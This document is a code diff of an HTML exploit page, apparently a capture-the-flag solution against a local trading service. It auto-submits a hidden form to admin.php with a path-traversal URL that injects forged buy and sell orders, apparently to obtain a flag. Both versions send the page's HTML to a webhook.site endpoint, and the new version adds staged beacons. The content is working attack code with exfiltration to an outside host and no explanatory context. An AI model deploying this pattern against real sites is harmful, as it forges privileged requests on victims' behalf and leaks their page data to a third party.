@@ -2,10 +2,22 @@
 <meta charset="utf-8">
 <form id="f" action="http://localhost:5000/admin.php" method="POST">
   <input type="hidden" name="url"
-    value="http://localhost:5000/admin.php/../index.php?html=-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20BUY%0A-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY%0A">
+    value="http://localhost:5000/admin.php/../index.php?html=-%20amount%3A%201000000%0A%20%20currency%3A%20US%0A%20%20op%3A%20BUY%0A-%20amount%3A%201000000%0A%20%20currency%3A%20US%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY%0A">
 </form>
 <script>
-f.submit();
-// Add webhook exfiltration
-fetch('https://webhook.site/1368f66f-01e2-4d27-9d16-e8c0a829ffd5?data='+encodeURIComponent(document.documentElement.innerHTML));
+// Save form reference
+var form = document.getElementById('f');
+
+// First send data to webhook
+fetch('https://webhook.site/1368f66f-01e2-4d27-9d16-e8c0a829ffd5?step=1&data=starting')
+  .then(() => {
+    // Then submit the form
+    form.submit();
+    
+    // Wait a bit and capture the resulting page
+    setTimeout(() => {
+      fetch('https://webhook.site/1368f66f-01e2-4d27-9d16-e8c0a829ffd5?step=2&data=' + 
+        encodeURIComponent(document.documentElement.innerHTML));
+    }, 1000);
+  });
 </script>
